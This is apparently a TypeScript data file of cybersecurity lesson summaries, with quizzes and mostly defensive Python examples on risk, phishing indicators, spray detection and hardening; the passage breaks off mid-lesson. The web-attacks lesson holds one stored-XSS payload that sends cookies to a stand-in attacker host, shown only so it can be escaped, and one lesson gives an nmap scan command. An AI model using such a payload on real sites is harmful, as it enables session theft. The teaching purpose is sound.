import type { LessonQuick } from '@/lib/lesson-quick'

const C = '/learn/cybersecurity'

// Python examples use the standard library, run offline, and are run for their output.
// Tool commands (nmap, Burp, SIEM queries) are shown as code for authorised use only.
export const CYBER_QUICK: Record<string, LessonQuick> = {
  [`${C}/what-is-cybersecurity`]: {
    answer: 'Cybersecurity protects systems, networks and data from attackers who want money (ransomware, fraud), secrets (espionage) or disruption. Defenders reduce risk by understanding threats, layering controls, detecting attacks early and recovering quickly.',
    points: [
      'Attackers need one way in; defenders must cover many.',
      'Threat actors range from criminal groups to nation-states and insiders.',
      'Security is risk management, not the absence of risk.',
    ],
    example: {
      label: 'Risk = likelihood × impact, for a few threats',
      lang: 'python',
      code: `threats = {"phishing leads to account takeover": (4, 4), "laptop stolen, disk encrypted": (3, 1),
           "unpatched VPN exploited": (3, 5), "data centre flood": (1, 5)}
for name, (likelihood, impact) in sorted(threats.items(), key=lambda t: -t[1][0] * t[1][1]):
    print(f"{likelihood * impact:>2}  {name}")`,
    },
    check: {
      question: 'What is the most common motivation behind cyberattacks on businesses?',
      options: ['Curiosity', 'Financial gain', 'Testing software', 'Accident'],
      answer: 1,
      explanation: 'Ransomware, fraud and stolen data for sale make money the leading motive.',
    },
  },

  [`${C}/how-the-internet-works`]: {
    answer: 'Each internet layer has its own attack surface: IP source addresses can be spoofed, TCP handshakes can be flooded, DNS answers can be poisoned, and HTTP traffic can be read if TLS is missing. Knowing what each layer trusts tells you what an attacker can abuse there.',
    points: [
      'A layer 3 firewall cannot see layer 7 attacks such as SQL injection.',
      'SYN floods exhaust server state with half-open connections.',
      'TLS protects confidentiality and integrity in transit.',
    ],
    example: {
      label: 'What a network observer sees with and without TLS',
      lang: 'text',
      code: `HTTP  (port 80):  GET /login?user=ava&password=hunter2   ← fully readable
HTTPS (port 443): server name (SNI) chaduvuko.com, IPs, sizes, timing
                  ← the path, headers, cookies and body are encrypted`,
      static: true,
    },
    check: {
      question: 'Why can attackers easily spoof IP source addresses?',
      options: ['IP packets are encrypted', 'IP has no authentication of the source address', 'Routers check every address', 'DNS assigns them'],
      answer: 1,
      explanation: 'IP forwards on destination only; nothing verifies the source field, which enables spoofing and reflection attacks.',
    },
  },

  [`${C}/linux-for-security`]: {
    answer: 'Most servers run Linux, so security work needs it: navigating the filesystem (/etc config, /var/log evidence, /tmp world-writable), reading permissions, inspecting processes and network connections, and searching logs. SUID binaries, weak permissions and cron jobs are common escalation paths.',
    points: [
      'Permissions are read, write and execute for owner, group and others.',
      'SUID root binaries run as root, so audit them.',
      'Attackers often try to clear /var/log; ship logs off the host.',
    ],
    example: {
      label: 'Decode permission strings',
      lang: 'python',
      code: `import stat

for mode in (0o755, 0o644, 0o600, 0o4755):
    print(oct(mode), stat.filemode(stat.S_IFREG | mode), "← SUID" if mode & stat.S_ISUID else "")`,
    },
    check: {
      question: 'Why are SUID binaries owned by root a security concern?',
      options: ['They are slow', 'They run with root privileges, so a flaw in one can give a user root', 'They cannot be deleted', 'They disable logging'],
      answer: 1,
      explanation: 'SUID makes the program run as its owner; a bug or misuse can escalate privileges.',
    },
  },

  [`${C}/cryptography-fundamentals`]: {
    answer: 'Cryptography provides confidentiality (encryption), integrity (hashes, MACs), authentication and non-repudiation (signatures). Symmetric ciphers such as AES-GCM are fast with one shared key; asymmetric algorithms (RSA, ECC) solve key exchange and signatures; hashes such as SHA-256 fingerprint data.',
    points: [
      'Use authenticated encryption (AES-256-GCM, ChaCha20-Poly1305).',
      'Hash passwords with a slow, salted function (bcrypt, scrypt, Argon2).',
      'Never invent your own cryptography.',
    ],
    example: {
      label: 'Hashes detect tampering; HMAC adds a secret key',
      lang: 'python',
      code: `import hashlib, hmac

message = b"pay ava $100"
tampered = b"pay ava $900"
print(hashlib.sha256(message).hexdigest()[:16], "vs", hashlib.sha256(tampered).hexdigest()[:16])

key = b"shared-secret"
tag = hmac.new(key, message, "sha256").hexdigest()
print("valid tag:", hmac.compare_digest(tag, hmac.new(key, message, "sha256").hexdigest()))
print("tampered:", hmac.compare_digest(tag, hmac.new(key, tampered, "sha256").hexdigest()))`,
    },
    check: {
      question: 'Which is right for storing user passwords?',
      options: ['AES encryption', 'Plain SHA-256', 'A slow salted hash such as bcrypt or Argon2', 'Base64'],
      answer: 2,
      explanation: 'Password hashes must be slow and salted to resist offline guessing; fast hashes and reversible encryption are not.',
    },
  },

  [`${C}/cia-triad-security-models`]: {
    answer: 'The CIA triad names three properties security protects: confidentiality (only authorised people can read), integrity (data is accurate and unaltered) and availability (systems work when needed). Every attack breaks at least one, and every control defends at least one.',
    points: [
      'Encryption and access control protect confidentiality.',
      'Hashes, signatures and audit logs protect integrity.',
      'Redundancy, backups and DDoS protection protect availability.',
    ],
    example: {
      label: 'Attacks mapped to the property they break',
      lang: 'text',
      code: `Database dump leaked online         → Confidentiality
Invoice bank details altered          → Integrity
Ransomware encrypts file servers      → Availability (and often Confidentiality)
DDoS takes the checkout page offline  → Availability`,
      static: true,
    },
    check: {
      question: 'An attacker changes account numbers on invoices. Which property is violated?',
      options: ['Confidentiality', 'Integrity', 'Availability', 'None'],
      answer: 1,
      explanation: 'The data was modified without authorisation, which breaks integrity.',
    },
  },

  [`${C}/cybersecurity-careers-us`]: {
    answer: 'Security careers fall into tracks: security operations (SOC analyst, often the entry point), penetration testing, application security, cloud security, governance, risk and compliance (GRC), and security engineering and architecture. Hands-on labs, write-ups and a first certification such as Security+ open the door.',
    points: [
      'SOC roles are the most common entry path.',
      'AppSec and cloud security reward development skills.',
      'Show work: home labs, CTF write-ups, detection rules.',
    ],
    example: {
      label: 'Matching a background to a starting track',
      lang: 'text',
      code: `IT help desk / sysadmin   → SOC analyst, then detection engineering
Software developer        → application security
Cloud / DevOps engineer   → cloud security
Audit / policy background → GRC
Networking background     → network security, then pentesting`,
      static: true,
    },
    check: {
      question: 'Which track usually rewards a software development background most directly?',
      options: ['Physical security', 'Application security', 'Help desk', 'Compliance auditing'],
      answer: 1,
      explanation: 'AppSec means reviewing and fixing code, threat modelling designs and building secure pipelines.',
    },
  },

  [`${C}/attacker-mindset-kill-chain`]: {
    answer: 'Defenders model attackers with frameworks. The Cyber Kill Chain has seven phases (reconnaissance, weaponisation, delivery, exploitation, installation, command and control, actions on objectives); MITRE ATT&CK catalogues real-world tactics and techniques used to plan detections and test controls.',
    points: [
      'Breaking any phase can stop an intrusion.',
      'ATT&CK techniques have IDs, such as T1566 for phishing.',
      'Map your detections to ATT&CK to find gaps.',
    ],
    example: {
      label: 'Detection coverage against ATT&CK techniques',
      lang: 'python',
      code: `techniques = {"T1566 Phishing": True, "T1059 Command and scripting": True,
              "T1003 Credential dumping": False, "T1021 Remote services": True,
              "T1486 Data encrypted for impact": False}
covered = [t for t, has_rule in techniques.items() if has_rule]
print(f"coverage {len(covered)}/{len(techniques)}")
print("gaps:", [t for t, has_rule in techniques.items() if not has_rule])`,
    },
    check: {
      question: 'What is MITRE ATT&CK?',
      options: ['An antivirus product', 'A catalogue of real attacker tactics and techniques', 'A compliance standard', 'A firewall'],
      answer: 1,
      explanation: 'It documents observed behaviour from real intrusions, which defenders use to design and test detections.',
    },
  },

  [`${C}/social-engineering-phishing`]: {
    answer: 'Social engineering manipulates people rather than software, using authority, urgency, fear, curiosity and helpfulness. Phishing is its most common form, from mass emails to targeted spear phishing, smishing (SMS) and vishing (voice). Defences combine training, email authentication, phishing-resistant MFA and easy reporting.',
    points: [
      'Urgency plus an unusual request is the classic warning sign.',
      'Verify payment or credential requests through a separate channel.',
      'Phishing-resistant MFA (FIDO2, passkeys) blunts stolen passwords.',
    ],
    example: {
      label: 'Simple phishing indicators in an email',
      lang: 'python',
      code: `email = {"from": "IT Support <it-support@chaduvuko-helpdesk.co>",
         "reply_to": "reset@freemail.example",
         "subject": "URGENT: password expires in 1 hour",
         "link": "http://chaduvuko.com.reset-portal.example/login"}

flags = []
if "chaduvuko.com" not in email["from"].split("@")[-1]: flags.append("sender domain is not ours")
if email["reply_to"].split("@")[-1] != email["from"].split("@")[-1].rstrip(">"): flags.append("reply-to differs")
if "URGENT" in email["subject"].upper(): flags.append("urgency")
if not email["link"].split("/")[2].endswith("chaduvuko.com"): flags.append("link host is a lookalike")
print(flags)`,
    },
    check: {
      question: 'Your "CEO" emails asking for an urgent wire transfer. What should you do?',
      options: ['Pay quickly', 'Reply to the email to confirm', 'Verify through a known separate channel, such as a phone number you already have', 'Forward it to a colleague to pay'],
      answer: 2,
      explanation: 'Replying reaches the attacker. Out-of-band verification defeats business email compromise.',
    },
  },

  [`${C}/web-attacks-owasp`]: {
    answer: 'The OWASP Top 10 lists the most critical web application risks, led by broken access control (such as insecure direct object references), cryptographic failures and injection (SQL injection, cross-site scripting). Most come from trusting user input or skipping authorisation checks on the server.',
    points: [
      'Check authorisation on the server for every object request.',
      'Use parameterised queries; never concatenate input into SQL.',
      'Encode output for its context to prevent XSS.',
    ],
    example: {
      label: 'HTML-escaping user input prevents stored XSS',
      lang: 'python',
      code: `import html

comment = '<script>fetch("https://evil.example/?c=" + document.cookie)</script>'
print("unsafe:", comment)
print("escaped:", html.escape(comment))`,
    },
    check: {
      question: 'Changing /invoices/1001 to /invoices/1002 shows another customer\'s invoice. What is this?',
      options: ['SQL injection', 'Insecure direct object reference (broken access control)', 'XSS', 'CSRF'],
      answer: 1,
      explanation: 'The server returns objects without checking that they belong to the requesting user.',
    },
  },

  [`${C}/network-attacks`]: {
    answer: 'Network attacks abuse protocols that trust by default: ARP poisoning and rogue access points put an attacker in the middle (MITM), DNS spoofing redirects users, and SSL stripping downgrades HTTPS to HTTP. Defences include Dynamic ARP Inspection, DNSSEC, HSTS preloading and encrypting everything.',
    points: [
      'MITM needs interception; reading the traffic also needs broken or missing TLS.',
      'HSTS makes browsers refuse plain HTTP for a site.',
      'Switch features stop most LAN-level attacks.',
    ],
    example: {
      label: 'An HSTS header that defeats SSL stripping',
      lang: 'text',
      code: `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload

# browsers then refuse to connect to the site over plain HTTP for two years`,
      static: true,
    },
    check: {
      question: 'Which header stops browsers from being downgraded to HTTP?',
      options: ['Content-Security-Policy', 'Strict-Transport-Security', 'X-Frame-Options', 'Set-Cookie'],
      answer: 1,
      explanation: 'HSTS tells the browser to use HTTPS only; preloading covers even the first visit.',
    },
  },

  [`${C}/malware-types-behavior`]: {
    answer: 'Malware families behave differently: ransomware encrypts files (AES for speed, with the key locked by the attacker\'s RSA key) and often steals data first; worms spread on their own; trojans pose as legitimate software; remote access trojans give attackers control; rootkits hide in the operating system.',
    points: [
      'Ransomware operations often spend days or weeks inside before encrypting.',
      'Offline, tested backups are the key recovery control.',
      'Detection relies on behaviour, not just file signatures.',
    ],
    example: {
      label: 'A simple behavioural signal: many files rewritten with high entropy',
      lang: 'python',
      code: `import math, os
from collections import Counter

def entropy(data):
    counts = Counter(data)
    return -sum(c / len(data) * math.log2(c / len(data)) for c in counts.values())

plain = b"Quarterly report: revenue grew in every region. " * 40
encrypted_like = bytes((i * 167 + 13) % 256 for i in range(2000))   # stands in for ciphertext
print(f"plain text entropy {entropy(plain):.2f} bits/byte")
print(f"encrypted-looking  {entropy(encrypted_like):.2f} bits/byte (near 8 is suspicious)")`,
    },
    check: {
      question: 'What is the most reliable recovery control against ransomware?',
      options: ['Paying the ransom', 'Offline, regularly tested backups', 'Antivirus alone', 'Renaming files'],
      answer: 1,
      explanation: 'Backups the attacker cannot reach or delete let you restore without depending on the attacker.',
    },
  },

  [`${C}/authentication-attacks`]: {
    answer: 'Many attacks abuse credentials instead of cracking them: credential stuffing replays leaked passwords, password spraying tries one common password across many accounts, pass-the-hash reuses Windows NT hashes, Kerberoasting cracks service tickets offline, and stolen session tokens bypass MFA.',
    points: [
      'MFA blocks most password-only attacks.',
      'Long, random service-account passwords defeat Kerberoasting.',
      'Detect spraying: one source failing logins across many accounts.',
    ],
    example: {
      label: 'Spot password spraying in login logs',
      lang: 'python',
      code: `from collections import defaultdict

failed = [("203.0.113.9", "ava"), ("203.0.113.9", "ben"), ("203.0.113.9", "cy"),
          ("203.0.113.9", "dee"), ("198.51.100.4", "ava"), ("198.51.100.4", "ava")]
users_per_ip = defaultdict(set)
for ip, user in failed:
    users_per_ip[ip].add(user)
for ip, users in users_per_ip.items():
    verdict = "possible spraying" if len(users) >= 4 else "ordinary failures"
    print(ip, len(users), "accounts:", verdict)`,
    },
    check: {
      question: 'What is password spraying?',
      options: ['Many passwords against one account', 'One common password tried against many accounts', 'Stealing password hashes', 'Phishing for passwords'],
      answer: 1,
      explanation: 'Trying one password per account stays under lockout thresholds while testing many users.',
    },
  },

  [`${C}/vulnerabilities-and-exploits`]: {
    answer: 'A CVE identifies a vulnerability, CVSS scores its technical severity, CWE names its root cause, and EPSS estimates how likely it is to be exploited. Prioritise with all of them plus the CISA Known Exploited Vulnerabilities (KEV) list and how critical the affected asset is.',
    points: [
      'Only a small share of CVEs are ever exploited in the wild.',
      'Anything on CISA KEV that you run needs urgent patching.',
      'Internet-facing assets come first.',
    ],
    example: {
      label: 'Prioritise by exploitation evidence, not CVSS alone',
      lang: 'python',
      code: `vulns = [
    {"cve": "CVE-A", "cvss": 9.8, "epss": 0.02, "kev": False, "internet": False},
    {"cve": "CVE-B", "cvss": 7.5, "epss": 0.91, "kev": True,  "internet": True},
    {"cve": "CVE-C", "cvss": 8.1, "epss": 0.40, "kev": False, "internet": True},
]

def priority(v):
    return (v["kev"], v["internet"], v["epss"], v["cvss"])

for v in sorted(vulns, key=priority, reverse=True):
    print(v["cve"], f"cvss {v['cvss']}", f"epss {v['epss']:.2f}", "KEV" if v["kev"] else "")`,
    },
    check: {
      question: 'Which signal shows a vulnerability is actively exploited?',
      options: ['A high CVSS score', 'Listing in CISA\'s Known Exploited Vulnerabilities catalogue', 'A CWE number', 'Its age'],
      answer: 1,
      explanation: 'KEV lists confirmed in-the-wild exploitation; CVSS measures severity, not likelihood.',
    },
  },

  [`${C}/python-for-security`]: {
    answer: 'Python is the main scripting language in security: tools such as Scapy, Impacket and Volatility are written in it, and analysts use it to parse logs, query APIs, automate triage and build small tools such as port checkers, always against systems they are authorised to test.',
    points: [
      'socket.connect_ex returns 0 when a TCP port is open.',
      'Thread pools speed up network checks that mostly wait.',
      'Parse logs with regular expressions and collections.Counter.',
    ],
    example: {
      label: 'Check ports on your own machine (localhost only)',
      lang: 'python',
      code: `import socket

listener = socket.socket()
listener.bind(("127.0.0.1", 8080))     # a port we open ourselves, to probe
listener.listen()

for port in (8080, 9):
    with socket.socket() as s:
        s.settimeout(0.5)
        state = "open" if s.connect_ex(("127.0.0.1", port)) == 0 else "closed"
        print(f"127.0.0.1:{port} {state}")`,
    },
    check: {
      question: 'What must you have before scanning any system you do not own?',
      options: ['A fast connection', 'Explicit written authorisation', 'A VPN', 'Python 3.12'],
      answer: 1,
      explanation: 'Unauthorised scanning and access can be illegal; professional testing always starts with written permission.',
    },
  },

  [`${C}/networking-deep-dive`]: {
    answer: 'Security depends on network design: segment networks with subnets and VLANs to limit lateral movement, use stateful firewalls that only allow needed flows, understand that NAT is not a firewall, and protect remote access with VPNs or, increasingly, zero-trust access that checks identity on every request.',
    points: [
      'Segmentation contains a breach to one zone.',
      'Default deny, then allow specific flows.',
      'Zero trust removes implicit trust in the internal network.',
    ],
    example: {
      label: 'Is a flow between zones allowed?',
      lang: 'python',
      code: `import ipaddress

zones = {"users": "10.10.0.0/16", "servers": "10.20.0.0/16", "payments": "10.30.0.0/24"}
allowed = {("users", "servers", 443), ("servers", "payments", 5432)}

def zone(ip):
    return next(z for z, net in zones.items() if ipaddress.ip_address(ip) in ipaddress.ip_network(net))

for src, dst, port in [("10.10.4.2", "10.20.1.5", 443), ("10.10.4.2", "10.30.0.9", 5432), ("10.20.1.5", "10.30.0.9", 5432)]:
    flow = (zone(src), zone(dst), port)
    print(flow, "allow" if flow in allowed else "deny")`,
    },
    check: {
      question: 'What is the main security benefit of network segmentation?',
      options: ['Faster internet', 'It limits how far an attacker can move after a breach', 'It replaces patching', 'It encrypts traffic'],
      answer: 1,
      explanation: 'Separate zones with controlled flows keep a compromised laptop from reaching the payment database.',
    },
  },

  [`${C}/linux-hardening`]: {
    answer: 'Hardening reduces a Linux server\'s attack surface: start from a minimal install, remove unneeded services, enforce least privilege and sudo rules, lock down SSH (keys only, no root login), set secure kernel parameters, enable SELinux or AppArmor, log with auditd, and measure against CIS benchmarks.',
    points: [
      'Every running service is attack surface.',
      'Mount /tmp with noexec,nosuid,nodev.',
      'Test sshd -t before restarting SSH remotely.',
    ],
    example: {
      label: 'Key SSH hardening settings (/etc/ssh/sshd_config)',
      lang: 'text',
      code: `PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
AllowUsers deploy ava
MaxAuthTries 3
X11Forwarding no

$ sudo sshd -t && sudo systemctl reload sshd`,
      static: true,
    },
    check: {
      question: 'Why run sshd -t before reloading SSH on a remote server?',
      options: ['It speeds up SSH', 'It validates the configuration so a typo cannot lock you out', 'It rotates keys', 'It is required by Linux'],
      answer: 1,
      explanation: 'A broken config can stop sshd, cutting off your only remote access.',
    },
  },

  [`${C}/windows-active-directory`]: {
    answer: 'Active Directory centralises identities, groups and policies for Windows networks, with credentials stored on domain controllers. Attackers target it for privilege escalation (Kerberoasting, DCSync, abusing excessive rights); defenders use tiered administration, Group Policy hardening, protected admin accounts, and graph tools such as BloodHound to find and close attack paths.',
    points: [
      'Domain Admins should never log on to workstations.',
      'Long, random service account passwords (or gMSAs) resist offline cracking.',
      'Review who can replicate directory changes; that right enables DCSync.',
    ],
    example: {
      label: 'Find paths to Domain Admins in a group graph',
      lang: 'python',
      code: `from collections import deque

member_of = {"ava": ["helpdesk"], "helpdesk": ["server-admins"], "server-admins": ["domain-admins"],
             "ben": ["sales"], "sales": []}

def path_to(start, target="domain-admins"):
    queue = deque([[start]])
    while queue:
        path = queue.popleft()
        for group in member_of.get(path[-1], []):
            if group == target:
                return path + [group]
            queue.append(path + [group])
    return None

print("ava:", path_to("ava"))
print("ben:", path_to("ben"))`,
    },
    check: {
      question: 'Why keep Domain Admin accounts off ordinary workstations?',
      options: ['To save licences', 'Their credentials could be stolen from a compromised workstation', 'Workstations cannot run admin tools', 'Group Policy forbids it'],
      answer: 1,
      explanation: 'Logging on leaves credential material in memory; tiering stops a laptop compromise becoming domain compromise.',
    },
  },

  [`${C}/cloud-security`]: {
    answer: 'Under the shared responsibility model the cloud provider secures the infrastructure and you secure what you build on it: identities and permissions, data, network exposure and configuration. Most cloud breaches come from misconfiguration, such as public storage, over-broad IAM roles and long-lived access keys.',
    points: [
      'Prefer roles with temporary credentials over access keys.',
      'Enforce IMDSv2 to blunt SSRF theft of instance credentials.',
      'Block public access to storage by default.',
    ],
    example: {
      label: 'Flag risky statements in an IAM policy',
      lang: 'python',
      code: `policy = {"Statement": [
    {"Effect": "Allow", "Action": "s3:GetObject", "Resource": "arn:aws:s3:::reports/*"},
    {"Effect": "Allow", "Action": "*", "Resource": "*"},
    {"Effect": "Allow", "Action": "iam:PassRole", "Resource": "*"},
]}
for i, st in enumerate(policy["Statement"]):
    if st["Effect"] == "Allow" and (st["Action"] == "*" or st["Resource"] == "*"):
        print(f"statement {i}: {st['Action']} on {st['Resource']} is too broad")`,
    },
    check: {
      question: 'Under shared responsibility, who secures an S3 bucket\'s access settings?',
      options: ['AWS', 'The customer', 'Both equally', 'Nobody'],
      answer: 1,
      explanation: 'The provider secures the service itself; how you configure access to your data is yours.',
    },
  },

  [`${C}/api-container-security`]: {
    answer: 'API security centres on authorisation for every object (broken object level authorisation is the top API risk), strict validation of tokens such as JWTs (fix the expected algorithm, check expiry and audience) and exact OAuth redirect matching. Container security adds minimal images, non-root users, no privileged containers and tight Kubernetes RBAC.',
    points: [
      'Test APIs with two accounts: can B read A\'s objects?',
      'Pin the JWT algorithm; never trust the token\'s own alg header.',
      'Run containers as non-root with read-only filesystems where possible.',
    ],
    example: {
      label: 'Reject a JWT whose header asks for the wrong algorithm',
      lang: 'python',
      code: `import base64, json

def b64(obj):
    return base64.urlsafe_b64encode(json.dumps(obj).encode()).rstrip(b"=").decode()

token = b64({"alg": "HS256", "typ": "JWT"}) + "." + b64({"sub": "ava", "role": "admin"}) + ".sig"
header = json.loads(base64.urlsafe_b64decode(token.split(".")[0] + "=="))
EXPECTED = "RS256"
print("header alg:", header["alg"])
print("accepted" if header["alg"] == EXPECTED else "rejected: unexpected algorithm")`,
    },
    check: {
      question: 'What is the safest way to choose the JWT verification algorithm?',
      options: ['Read it from the token header', 'Fix the expected algorithm in server configuration', 'Try every algorithm', 'Skip verification for internal APIs'],
      answer: 1,
      explanation: 'Trusting the token\'s alg header enables algorithm-confusion and "none" attacks.',
    },
  },

  [`${C}/secure-coding`]: {
    answer: 'Secure coding builds defences into software: validate input against an allowlist, encode output for its context, use parameterised queries, keep secrets out of code, keep dependencies patched, and run SAST, SCA and DAST in CI. Fixing a flaw in design is far cheaper than after a breach.',
    points: [
      'Allowlists beat blocklists.',
      'Encode for the final interpreter: HTML, SQL, shell or URL.',
      'Threat-model new features before building them.',
    ],
    example: {
      label: 'Allowlist validation of a username',
      lang: 'python',
      code: `import re

ALLOWED = re.compile(r"[a-z0-9_]{3,20}")
for name in ["ava_2026", "AVA", "x", "ava; DROP TABLE users", "<script>"]:
    print(f"{name!r:28} {'ok' if ALLOWED.fullmatch(name) else 'rejected'}")`,
    },
    check: {
      question: 'Why is allowlist validation stronger than a blocklist?',
      options: ['It is faster', 'It accepts only known-good input, so new attack encodings are rejected too', 'It needs no regex', 'Blocklists are illegal'],
      answer: 1,
      explanation: 'Attackers keep finding encodings a blocklist misses; an allowlist rejects anything unexpected.',
    },
  },

  [`${C}/penetration-testing-methodology`]: {
    answer: 'A penetration test is an authorised, scoped simulation of an attack. It requires written permission, a statement of work and rules of engagement, then follows phases: reconnaissance, scanning and enumeration, exploitation, post-exploitation and reporting with findings, evidence and fixes.',
    points: [
      'No written authorisation, no testing.',
      'Stay strictly within scope and the agreed time window.',
      'The report is the deliverable; make fixes actionable.',
    ],
    example: {
      label: 'What a rules-of-engagement document pins down',
      lang: 'text',
      code: `In scope:      app.acme.com, 10.40.0.0/24
Out of scope:  payments provider, employees' personal devices
Window:        2026-11-03 to 2026-11-14, 09:00–18:00 ET
Not allowed:   denial of service, social engineering of executives
Emergency:     stop and call +1-555-0100 on any production impact`,
      static: true,
    },
    check: {
      question: 'What must exist before any penetration test starts?',
      options: ['A finished report', 'Signed written authorisation and agreed scope', 'A public announcement', 'Exploit code'],
      answer: 1,
      explanation: 'Authorisation and scope make the work legal and keep it within agreed limits.',
    },
  },

  [`${C}/reconnaissance-osint`]: {
    answer: 'Reconnaissance gathers information about a target before testing. Passive OSINT uses public sources without touching the target: certificate transparency logs for subdomains, DNS and WHOIS records, search engines, code repositories, job posts and internet scan databases such as Shodan.',
    points: [
      'Certificate transparency reveals subdomains from issued certificates.',
      'Leaked secrets in public repositories are a frequent finding.',
      'Defenders should run the same recon on themselves.',
    ],
    example: {
      label: 'Extract unique subdomains from certificate names',
      lang: 'python',
      code: `cert_names = ["chaduvuko.com", "www.chaduvuko.com", "api.chaduvuko.com", "*.staging.chaduvuko.com",
              "vpn.chaduvuko.com", "api.chaduvuko.com", "grafana.internal.chaduvuko.com"]
subs = sorted({n.lstrip("*.") for n in cert_names if n != "chaduvuko.com"})
print(len(subs), "names:", subs)`,
    },
    check: {
      question: 'Why are certificate transparency logs useful for reconnaissance?',
      options: ['They contain passwords', 'Every public TLS certificate is logged, revealing subdomains', 'They show open ports', 'They list employees'],
      answer: 1,
      explanation: 'Certificates name the hosts they cover, and all publicly trusted certificates are logged.',
    },
  },

  [`${C}/scanning-enumeration`]: {
    answer: 'Scanning actively probes authorised targets to find live hosts, open ports and service versions, typically with nmap; enumeration then digs into each service (web directories, SMB shares, LDAP) to map the attack surface, and vulnerability scanners such as Nessus or Nuclei flag known issues.',
    points: [
      'Scanning is detectable; only scan what is in scope.',
      'Scan all TCP ports, then follow up with UDP.',
      'Version detection points to known vulnerabilities.',
    ],
    example: {
      label: 'A standard nmap scan of an authorised range',
      lang: 'bash',
      code: `nmap -sV -sC -p- -T4 --open -oA scans/internal 10.40.0.0/24
# -sV versions  -sC default scripts  -p- all ports  -oA save all formats`,
      static: true,
    },
    check: {
      question: 'What does nmap -sV add to a scan?',
      options: ['Stealth mode', 'Service and version detection', 'Vulnerability exploitation', 'UDP scanning'],
      answer: 1,
      explanation: '-sV probes open ports to identify the software and version running there.',
    },
  },
  [`${C}/exploitation-techniques`]: {
    answer: 'In an authorised, scoped penetration test, exploitation confirms a vulnerability is real by demonstrating controlled access, with every action documented. For a defender, its value is the lesson about which control failed: missing patch, weak configuration, flat network, or no detection.',
    points: [
      'Confirm a weakness exists before acting on it; never go outside the agreed scope.',
      'A reverse connection out on 443 slips past inbound firewalls, so egress filtering matters.',
      'Each exploited finding should map to a concrete fix and a detection rule.',
    ],
    example: {
      label: 'Turning a finding into a fix and a detection',
      lang: 'text',
      code: `Finding    Outdated web framework, known remote code execution
Fix        Patch to the supported release; add a WAF rule as interim cover
Detect     Alert on the framework process spawning a shell
Prevent    Egress filtering so an exploited host cannot call home`,
      static: true,
    },
    check: {
      question: 'For a defender, what is the main value of the exploitation phase?',
      options: ['Causing maximum damage', 'Learning which control failed so it can be fixed and detected', 'Installing backdoors', 'Measuring bandwidth'],
      answer: 1,
      explanation: 'Demonstrated impact, within scope, drives the patch, hardening and detection work that follows.',
    },
  },

  [`${C}/web-app-pentesting`]: {
    answer: 'Authorised web application testing finds flaws automated scanners miss: broken access control such as insecure direct object references, authentication and session weaknesses, injection, and business-logic errors like negative quantities or skipped payment steps. Each finding comes with a fix.',
    points: [
      'Access-control testing uses two accounts: can one reach the other\'s data?',
      'Business-logic flaws need understanding of what the app is meant to do.',
      'The server, never the browser, must enforce every rule.',
    ],
    example: {
      label: 'A business-logic check the server must make',
      lang: 'python',
      code: `def total(price, quantity):
    if quantity < 1:                       # a negative quantity would subtract from the bill
        raise ValueError("quantity must be at least 1")
    return round(price * quantity, 2)

print(total(9.99, 3))
try:
    total(9.99, -5)
except ValueError as e:
    print("rejected:", e)`,
    },
    check: {
      question: 'Where must application rules such as price and quantity limits be enforced?',
      options: ['In the browser only', 'On the server', 'In the database only', 'Nowhere'],
      answer: 1,
      explanation: 'Anything enforced only in the client can be bypassed; the server must re-check every rule.',
    },
  },

  [`${C}/post-exploitation`]: {
    answer: 'After access is gained in an authorised test, post-exploitation measures real impact: what privileges and data are reachable and how far an attacker could move. For defenders it highlights the controls that contain a breach — least privilege, segmentation, credential hygiene and monitoring.',
    points: [
      'Credentials left in config files and histories are a common escalation path.',
      'Segmentation limits lateral movement between systems.',
      'Logging privileged actions makes intrusions visible.',
    ],
    example: {
      label: 'Scan a config file for secrets that should not be there',
      lang: 'python',
      code: `import re

config = "db_host=10.20.1.5\\ndb_password=S3cr3t!\\napi_key=AKIA1234567890ABCD\\nlog_level=info"
secret = re.compile(r"(password|secret|api_key|token)\\s*=", re.IGNORECASE)
for line in config.splitlines():
    if secret.search(line):
        print("secret in config:", line.split('=')[0])`,
    },
    check: {
      question: 'Which control most limits an attacker moving from one compromised host to others?',
      options: ['A longer password policy', 'Network segmentation', 'A faster CPU', 'More disk space'],
      answer: 1,
      explanation: 'Segmentation with controlled flows stops a single foothold from reaching the whole network.',
    },
  },

  [`${C}/ctf-skills`]: {
    answer: 'Capture the Flag competitions build practical skills legally: each challenge is a self-contained puzzle in a safe environment. Categories include web, cryptography, reverse engineering, binary exploitation (pwn) and forensics. Beginner platforms such as PicoCTF and PortSwigger\'s academy teach the fundamentals.',
    points: [
      'CTFs are legal, isolated practice, unlike testing real systems.',
      'Crypto challenges often start with recognising an encoding.',
      'Write-ups of solved challenges make a strong portfolio.',
    ],
    example: {
      label: 'A common first step: decode layered encodings',
      lang: 'python',
      code: `import base64

flag = base64.b64encode("flag{hello_ctf}".encode()).hex()
print("challenge gives:", flag)
step1 = bytes.fromhex(flag)
print("after hex decode:", step1.decode())
print("after base64:", base64.b64decode(step1).decode())`,
    },
    check: {
      question: 'Why are CTFs a safe way to practise offensive skills?',
      options: ['They are illegal but untraceable', 'Each challenge is an isolated environment set up for the purpose', 'They use real company systems', 'They require no permission on live targets'],
      answer: 1,
      explanation: 'The targets are purpose-built and contained, so there is no real victim and no legal risk.',
    },
  },

  [`${C}/security-architecture`]: {
    answer: 'Secure architecture designs systems to withstand attack. Defence in depth layers independent controls (perimeter, network, host, identity, application, data, detection) so no single failure is fatal. Zero trust removes implicit trust in the network: every request is checked against identity, device health and context.',
    points: [
      'No single control should be the only thing standing between attacker and data.',
      'Zero trust treats the internal network as hostile.',
      'Phishing-resistant MFA for privileged accounts is a high-value first step.',
    ],
    example: {
      label: 'Layers an attacker must each defeat to reach the data',
      lang: 'text',
      code: `Perimeter    WAF, DDoS protection
Network      segmentation, default-deny firewall
Identity     phishing-resistant MFA, least privilege
Host         hardening, EDR
Application   input validation, secure coding
Data         encryption, tokenisation
Detection    SIEM alerts across every layer`,
      static: true,
    },
    check: {
      question: 'What does zero trust reject?',
      options: ['All encryption', 'Implicit trust based on network location', 'Multi-factor authentication', 'Firewalls'],
      answer: 1,
      explanation: 'Being inside the network grants nothing; each request is verified on its own merits.',
    },
  },

  [`${C}/identity-access-management`]: {
    answer: 'Identity is the modern perimeter. IAM covers authentication factors, single sign-on, role-based access control (RBAC) and privileged access management. Phishing-resistant factors (FIDO2 hardware keys, passkeys) beat one-time codes, which real-time proxy attacks can capture and replay.',
    points: [
      'RBAC grants permissions through roles, which is auditable.',
      'TOTP codes can be phished; FIDO2 and passkeys resist it.',
